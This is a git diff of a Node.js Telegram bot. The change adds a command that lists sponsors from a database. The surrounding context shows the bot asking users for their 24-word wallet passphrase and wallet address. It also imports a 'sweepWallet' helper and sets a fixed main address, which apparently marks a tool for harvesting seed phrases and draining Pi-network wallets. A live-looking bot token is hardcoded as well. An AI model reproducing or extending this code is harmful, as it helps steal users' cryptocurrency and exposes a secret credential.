@@ -2,6 +2,7 @@ import TelegramBot from "node-telegram-bot-api";
 import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
 import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
+import Sponsors from "./models/Sponsors.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -50,6 +51,33 @@ bot.onText(/\/uploadPassphrase/, (msg) => {
     bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
     userSessions[chatId] = { waitingForPassphraseAndAddress: true };
 });
+
+bot.onText(/\/listSpnsrs/, async (msg) => {
+  const chatId = msg.chat.id;
+
+  try {
+    const sponsors = await Sponsors.find(); // assuming this is a Mongoose model
+
+    if (sponsors.length === 0) {
+      return bot.sendMessage(chatId, '❌ No sponsors found.');
+    }
+
+    // Format each sponsor entry
+    const list = sponsors.map((s, index) => 
+      `${index + 1}. ${s.username || s.name || 'Unknown'} - ${s.amount || 'N/A'}`
+    ).join('\n');
+
+    // Send message
+    bot.sendMessage(chatId, `📋 *List of Sponsors:*\n\n${list}`, {
+      parse_mode: 'Markdown',
+    });
+
+  } catch (err) {
+    console.error('Error fetching sponsors:', err);
+    bot.sendMessage(chatId, '⚠️ Failed to fetch sponsors. Try again later.');
+  }
+});
+
 
 bot.onText(/\/uploadSponsor/, (msg) => {
     const chatId = msg.chat.id;
